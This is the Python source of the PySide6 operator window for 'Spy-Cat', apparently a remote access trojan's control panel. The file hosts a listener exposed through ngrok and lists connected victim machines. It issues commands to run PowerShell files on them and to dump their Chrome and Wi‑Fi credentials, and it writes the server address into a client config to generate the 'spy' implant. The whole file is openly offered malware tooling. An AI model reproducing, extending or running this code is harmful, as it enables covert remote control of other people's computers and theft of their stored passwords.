import configparser
import os
import sys
import re
from bin import *
from PySide6.QtCore import *
from PySide6.QtGui import *
from PySide6.QtWidgets import *

class MainWindow(QMainWindow):
    def __init__(self) -> None:
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.functions = Functions()
        self.threadPool = QThreadPool()
        # events
        self.ui.btn_hostServer.clicked.connect(self.hostServer)
        self.ui.cmdPromptPlainText.textChanged.connect(self.cmdPromptPlainTextAction)
        self.ui.btn_sendIt.clicked.connect(self.sendCommand)
        self.ui.btn_createSpy.clicked.connect(self.generateSpy)
        # serverSignals
        self.functions.server.signals.serverStatue.connect(self.connStyles)
        self.functions.server.signals.clientJoined.connect(lambda info: self.clientListActions(info, '+'))
        self.functions.server.signals.clientEscaped.connect(lambda info: self.clientListActions(info, '-'))
        self.functions.server.signals.cmdResult.connect(self.displayClientReply)
        self.functions.server.signals.serverError.connect(self.printToCmdPrompt)

        self.show()
        

    ########################### UI Functions ##########################
    def generateSpy(self):
        config = configparser.ConfigParser()
        confile = os.getcwd() + r'\bin\modules\client\address.ini'
        config.read(confile)
        if self.functions.ngrokAddress:
            config.set('server', 'ip', self.functions.ngrokAddress[0])
            config.set('server', 'port', self.functions.ngrokAddress[1])
        else:
            config.set('server', 'ip', '0')
            config.set('server', 'port', '63999')
                
    def displayClientReply(self, info: tuple):
        clientId, data= info
        self.printToCmdPrompt('>>> Reply from '+clientId+':', 'rgb(189, 255, 0)')
        self.printToCmdPrompt('---'*20, 'rgb(189, 255, 0)')
        self.printToCmdPrompt(data, 'rgb(255, 255, 255)')
        self.printToCmdPrompt('---'*20, 'rgb(189, 255, 0)')

    def printToCmdPrompt(self, textMsg: str, colorRgb: str='rgb(233, 12, 89)'):
        labelsys = QLabel()
        labelsys.setObjectName('systemMsg')
        labelsys.setTextInteractionFlags(Qt.TextSelectableByMouse | 
                                         Qt.TextSelectableByKeyboard | 
                                         Qt.LinksAccessibleByMouse | 
                                         Qt.LinksAccessibleByKeyboard)
        labelsys.setStyleSheet('QLabel {font: 11pt "Roboto"; color: '+colorRgb+';}')
        labelsys.setText(textMsg)
        # labelsys.setAlignment(Qt.AlignHCenter)
        self.ui.vbox_cmdPrompt.addWidget(labelsys, alignment=Qt.AlignBottom)
        # scroll to the bottom
        vsb = self.ui.scrollArea_cmdPrompt.verticalScrollBar()
        vsb.rangeChanged.connect(lambda: vsb.setValue(vsb.maximum()))
    
    def sendCommand(self):
        if self.functions.server.alive:
            cmd = self.ui.cmdPromptPlainText.toPlainText().strip()
            result = self.checkCommand(cmd)
            if isinstance(result, str):
                self.printToCmdPrompt('>>> ' + result)
            else:
                if self.functions.lineUpCmd(result):
                    self.ui.cmdPromptPlainText.setPlainText('')
                else:
                    self.printToCmdPrompt(f'>>> IncorrectClientID: The clientID you specified is incorrect')

    @staticmethod
    def getValues(string: str, args: tuple) -> dict:
        result = dict()
        string += ','
        for arg in args:
            if re.match(arg, string, flags=re.IGNORECASE):
                if arg == 'clientid':
                    ptrn = re.compile(pattern=f'\s*{arg}\s*=\s*(.*?)\s*,\s*', flags=re.DOTALL | re.IGNORECASE)
                else:
                    ptrn = re.compile(pattern=f'\s*{arg}\s*=\s*(.*)\s*,\s*', flags=re.DOTALL | re.IGNORECASE)

                matches = ptrn.findall(string)
                if matches:
                    result[arg] = matches[0]
                    string = string[string.index(',')+1:].strip()
                else:
                    result[arg] = ''
            else:
                result[arg] = ''
        return result

    def checkCommand(self, cmd: str) -> tuple[str, dict]:
        tools = {'freeclient': ('clientid',), 
                'ps': ('clientid', 'psfile'), 
                'getchromedump': ('clientid',), 
                'getwifidump': ('clientid',)}
        
        tool = cmd.split(' ', 1)[0].lower()
        if tool in tools.keys():
            string = cmd[len(tool):].strip()
            args = self.getValues(string, tools[tool])
            for arg in args.keys():
                if not args[arg]:
                    return f'ArgumentError: The argument "{arg}" was not supplied'
            return (tool, args)
        else:
            return f'SyntaxError: The term "{tool}" is not recognized as a SpyCat Tool'

    def cmdPromptPlainTextAction(self):
        # big brain stuff you wouldn't understand
        size = 40 + self.ui.cmdPromptPlainText.document().lineCount() * 20  # 40 + lineCount * 20 = x <- height needed
        if size > 180:
            size = 180
        self.ui.cmdPromptBottomFrame.setMaximumHeight(size)
        if self.ui.cmdPromptPlainText.document().lineCount() >= 9:  # show the scroll bar when we hit 9 lines
            self.ui.cmdPromptPlainText.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOn)
        else:
            self.ui.cmdPromptPlainText.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
    
    def clientListActions(self, clientInfo: dict, action: str = '+'):
        if action == '+':
            self.ui.listWidget_Clients.addItem(f"[{clientInfo['ID']}]:{clientInfo['hostName']}")
        else:
            items = self.ui.listWidget_Clients.findItems(f"[{clientInfo['ID']}]:{clientInfo['hostName']}", Qt.MatchExactly)
            self.ui.listWidget_Clients.takeItem(self.ui.listWidget_Clients.row(items[0]))
    
    def hostServer(self):
        worker = Worker(self.functions.serverConnTrigger, 0, self.ui.cbox_hostType.currentIndex())
        animation = QMovie(r":/all/bin/images/loadingInf.gif")
        worker.signals.started.connect(lambda: self.triggerloadingAnimation(animation=animation, btn=self.ui.btn_hostServer, start=True))
        worker.signals.finished.connect(lambda: self.triggerloadingAnimation(animation=animation, btn=self.ui.btn_hostServer, start=False))
        self.threadPool.start(worker)
            
    @staticmethod
    def triggerloadingAnimation(animation: QMovie, btn: QPushButton, start: bool):
        animation.frameChanged.connect(lambda: btn.setIcon(animation.currentPixmap()))
        if start:
            btn.setEnabled(False)
            animation.start()
        else:
            btn.setEnabled(True)
            animation.stop()
            btn.setIcon(QIcon())
            del animation

    def connStyles(self, statue):
        if statue:
            self.ui.btn_hostServer.setStyleSheet(self.ui.btn_hostServer.styleSheet().replace("rgb(233, 12, 89);", "rgb(189, 255, 0);"))
            self.ui.btn_hostServer.setText("Listening for connections...")
            self.ui.cbox_hostType.setEnabled(False)
            self.ui.btn_createSpy.setEnabled(True)
        else:
            self.ui.btn_hostServer.setStyleSheet(self.ui.btn_hostServer.styleSheet().replace("rgb(189, 255, 0);", "rgb(233, 12, 89);"))
            self.ui.btn_hostServer.setText("Host")
            self.ui.listWidget_Clients.clear()
            self.ui.cbox_hostType.setEnabled(True)
            self.ui.btn_createSpy.setEnabled(False)

    # override methods
    def closeEvent(self, event: QCloseEvent) -> None:  # handle close window
        msg = QMessageBox.question(self,
                                   "Window close",
                                   "Are you sure you want to close the window ?",
                                   QMessageBox.Yes, QMessageBox.No)
        if msg == QMessageBox.Yes:
            # stop all running threads
            self.functions.server.killServer()
            self.functions.runPS(r'Stop-Process -n "ngrok"')
            while self.functions.threadPool.activeThreadCount() and self.threadPool.activeThreadCount():
                pass  # wait until all threads are stopped
            event.accept()
        else:
            event.ignore()

    def resizeEvent(self, event):
        self.cmdPromptPlainTextAction()
        
if __name__ == "__main__":
    app = QApplication()
    app.setApplicationName('Spy-Cat')
    app.setApplicationVersion('v1.0.0 (64-bit)')
    app.setWindowIcon(QIcon(r':/all/bin/images/cat.ico'))
    window = MainWindow()
    sys.exit(app.exec())